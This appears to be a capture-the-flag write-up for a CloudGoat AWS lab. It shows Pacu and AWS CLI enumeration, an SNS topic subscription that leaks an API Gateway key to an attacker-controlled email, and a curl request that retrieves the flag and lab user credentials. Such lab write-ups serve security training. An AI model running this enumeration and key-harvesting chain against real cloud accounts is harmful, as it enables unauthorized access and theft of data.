### Initial Credentials
```bash
[cloudgoat] terraform output completed with no error code.
sns_user_access_key_id = AKIA.....
sns_user_secret_access_key = zlhWu.....
```
### Initial Credentials Enumeration
##### whoami
```bash
aws sts get-caller-identity --profile sns    
{
    "UserId": "AIDAURY6ZIC4DXYPD2OEH",
    "Account": "313060311224",
    "Arn": "arn:aws:iam::313060311224:user/cg-sns-user-cgid8rri0he 947"
}
```
##### Permissions Enumeration
```
Pacu (sns:imported-sns) > whoami
{
  "UserName": "cg-sns-user-cgid8rri0he947",
  "RoleName": null,
  "Arn": "arn:aws:iam::313060311224:user/cg-sns-user-cgid8rri0he947",
  "AccountId": "313060311224",
  "UserId": "AIDAURY6ZIC4DXYPD2OEH",
  "Roles": null,
  "Groups": [],
  "Policies": [
    {
      "PolicyName": "cg-sns-user-policy-cgid8rri0he947"
    }
  ],
  "AccessKeyId": "AKIAURY....",
  "SecretAccessKey": "zlhWuzYeSPn6GODLV1mE********************",
  "SessionToken": null,
  "KeyAlias": "imported-sns",
  "PermissionsConfirmed": true,
  "Permissions": {
    "Allow": {
      "iam:listgroupsforuser": {
        "Resources": [
          "*"
        ]
      },
      "sns:subscribe": {
        "Resources": [
          "*"
        ]
      },
      "apigateway:get": {
        "Resources": [
          "*"
        ]
      },
      "sns:receive": {
        "Resources": [
          "*"
        ]
      },
      "iam:listattacheduserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "iam:listuserpolicies": {
        "Resources": [
          "*"
        ]
      },
      "sns:listsubscriptionsbytopic": {
        "Resources": [
          "*"
        ]
      },
      "sns:gettopicattributes": {
        "Resources": [
          "*"
        ]
      },
      "sns:listtopics": {
        "Resources": [
          "*"
        ]
      },
      "iam:getuserpolicy": {
        "Resources": [
          "*"
        ]
      }
    },
    "Deny": {
      "apigateway:get": {
        "Resources": [
          "arn:aws:apigateway:us-east-1::/apikeys",
          "arn:aws:apigateway:us-east-1::/restapis/*/methods/GET",
          "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET",
          "arn:aws:apigateway:us-east-1::/restapis/*/integration",
          "arn:aws:apigateway:us-east-1::/apikeys/*",
          "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration",
          "arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration"
        ]
      }
    }
  }

```

##### SNS Enumeration
I ran the command search sns command on pacu and found the sns__enum module
```bash

Pacu (sns:imported-sns) > data SNS
{
  "sns": {
    "af-south-1": {},
    "ap-east-1": {},
    "ap-south-2": {},
    "ap-southeast-3": {},
    "ap-southeast-4": {},
    "ca-west-1": {},
    "cn-north-1": {},
    "cn-northwest-1": {},
    "eu-central-2": {},
    "eu-south-1": {},
    "eu-south-2": {},
    "il-central-1": {},
    "me-central-1": {},
    "me-south-1": {},
    "us-east-1": {
      "arn:aws:sns:us-east-1:313060311224:public-topic-cgid8rri0he947": {
        "DisplayName": "",
        "Owner": "313060311224",
        "Subscribers": [],
        "SubscriptionsConfirmed": "0",
        "SubscriptionsPending": "0"
      }
    },
    "us-gov-east-1": {},
    "us-gov-west-1": {}
  }
}
```
##### SNS Subscription
I ran the command
```
run sns__subscribe --topics arn:aws:sns:us-east-1:313060311224:public-topic-cgid8rri0he947 --email .......
```
from there I was able to check my attacker controlled email for the dev api key
```
DEBUG: API GATEWAY KEY 45a3da610dc64703b10e273a4db135bf
```
##### API Enumeration
First I retrieved info about the api
```bash
aws apigateway get-rest-apis --profile sns --region us-east-1
{
    "items": [
        {
            "id": "juzm6qcnp1",
            "name": "cg-api-cgid8rri0he947",
            "description": "API for demonstrating leaked API key scenario",
            "createdDate": "2025-06-24T18:08:40-04:00",
            "apiKeySource": "HEADER",
            "endpointConfiguration": {
                "types": [
                    "EDGE"
                ],
                "ipAddressType": "ipv4"
            },
            "tags": {
                "Scenario": "iam_privesc_by_key_rotation",
                "Stack": "CloudGoat"
            },
            "disableExecuteApiEndpoint": false,
            "rootResourceId": "zxnw81vrdl"
        }
    ]
}

```
then I enumerated the stages of the api
```bash
aws apigateway get-stages --profile sns --region us-east-1 --rest-api-id juzm6qcnp1
{
    "item": [
        {
            "deploymentId": "5uoqx8",
            "stageName": "prod-cgid8rri0he947",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "tags": {
                "Scenario": "iam_privesc_by_key_rotation",
                "Stack": "CloudGoat"
            },
            "createdDate": "2025-06-24T18:08:41-04:00",
            "lastUpdatedDate": "2025-06-24T18:08:41-04:00"
        }
    ]
}

```
and the resources
```bash
aws apigateway get-resources --profile sns --region us-east-1 --rest-api-id juzm6qcnp1
{
    "items": [
        {
            "id": "qbrntg",
            "parentId": "zxnw81vrdl",
            "pathPart": "user-data",
            "path": "/user-data",
            "resourceMethods": {
                "GET": {}
            }
        },
        {
            "id": "zxnw81vrdl",
            "path": "/"
        }
    ]
}
```
##### Exploiting the endpoint
After some googling found aws endpoints are structured as
```url
https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]
```
this turns our link into
```url
https://juzm6qcnp1.execute-api.us-east-1.amazonaws.com/prod-cgid8rri0he947/user-data
```
from there all we needed to do was make a curl get request attaching the debugger id to get the final flag
```bash
curl -X GET "https://juzm6qcnp1.execute-api.us-east-1.amazonaws.com/prod-cgid8rri0he947/user-data" -H "x-api-key: 45a3da610dc64703b10e273a4db135bf"






{"final_flag":"FLAG{SNS_S3cr3ts_ar3_FUN}","message":"Access granted","user_data":{"email":"SuperAdmin@notarealemail.com","password":"p@ssw0rd123","user_id":"1337","username":"SuperAdmin"}}   
```
